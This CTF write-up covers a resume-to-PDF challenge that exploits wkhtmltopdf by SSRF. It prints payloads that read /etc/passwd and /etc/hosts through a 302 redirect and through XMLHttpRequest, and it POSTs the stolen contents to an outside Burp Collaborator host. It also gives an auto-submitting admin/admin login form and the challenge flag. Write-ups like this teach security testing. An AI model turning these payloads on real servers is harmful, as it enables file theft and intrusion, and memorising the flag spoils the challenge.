# Resume

### Challenge Details

This challenge is testing on SSRF(I personally think it is much more than a SSRF, just imagine a scenario where a browser reside in the internal network is executing arbitrary HTML/JS file you feed it). 

A resume generator website, user can enter their personal details, backend will generate a HTML resume template and call `wkhtmltopdf` to generate the PDF file from that HTML resume. 

In the older version of wkhtmltopdf(prior of the latest 12.6, refer to [wkhtmltopdf/wkhtmltopdf#4536](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536) ), it is vulnerable to local file disclosure. 

I am hosting another website locally, its domain will be resolved via /etc/hosts. This website requires login, but common parameters and weak credentials are being used. Player needs to craft an auto-submitting form to login to the website to get the flag.

### Setup Instruction

```
docker-compose up -d
# optional
add a cronjob to delete the generated pdf every 5 minutes.
```

### Possible hints

> Have you checked what is being used to generate pdf?

> Have you checked commons files on the Linux file system?

> sometimes a single point of failure might just arise from a weak credential.

### Key concept

- 302 redirect usage in SSRF
- XSS techniques to read content.

- XSS techniques to automate form submission

### Solution

##### Read file

This will not work:

```html
<iframe src="file:///etc/passwd"></iframe>
```

But this will work:

```html
<iframe src="https://yourownwebsite/ssrf.php?a=file:///etc/passwd"></iframe>
```

when visiting `https://yourownwebsite/ssrf.php?a=file:///etc/passwd`, you will get a 302 response redirecting to `file:///etc/passwd`, and the contents of `/etc/passwd` will be inside the generated PDF.

------

Another way is to use XMLHTTPRequest, this would work probably because SOP is guaranteed in the process of generating the PDF, hence the content can be retrieved.

```html
<script>
    x = new XMLHttpRequest;
    x.onload = function(){
    y = new XMLHttpRequest;
    y.open('POST', "http://0vwlcrnm27hbj5zyz8kugdcshjn9by.burpcollaborator.net/", true);
    y.setRequestHeader("Content-Type","text/plain");
    y.send(this.responseText);
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```

#####  Found a local website

```
<script>
    x = new XMLHttpRequest;
    x.onload = function(){
    y = new XMLHttpRequest;
    y.open('POST', "http://0vwlcrnm27hbj5zyz8kugdcshjn9by.burpcollaborator.net/", true);
    y.setRequestHeader("Content-Type","text/plain");
    y.send(this.responseText);
    };
    x.open("GET","file:///etc/hosts");
    x.send();
</script>
```

```
127.0.0.1 topsecret.local
```

##### Get the flag

Directly curling with modified Host header to the server would not work because I check for `$_SERVER['REMOTE_ADDR']`, only serve the request if `$_SERVER['REMOTE_ADDR'] === "127.0.0.1"`

Need to let wkthmltopdf to request for us

```
<iframe src="http://topsecret.local" width=600 height=600> </iframe>
```

And it's just a simple login form, with weak credentials being used. Craft a auto-submitting form will give you the flag

```html
<form id='asdf' action="http://topsecret.local" method="POST">
<input name='username' value='admin'>
<input name='password' value='admin'>
<form>
<script>
document.getElementById('asdf').submit();
</script>
```

### Learning objective

the same as key concepts?

### Flag

```
greyhats{7h12_12_MOr3_7HaN_AN_55rf}
```


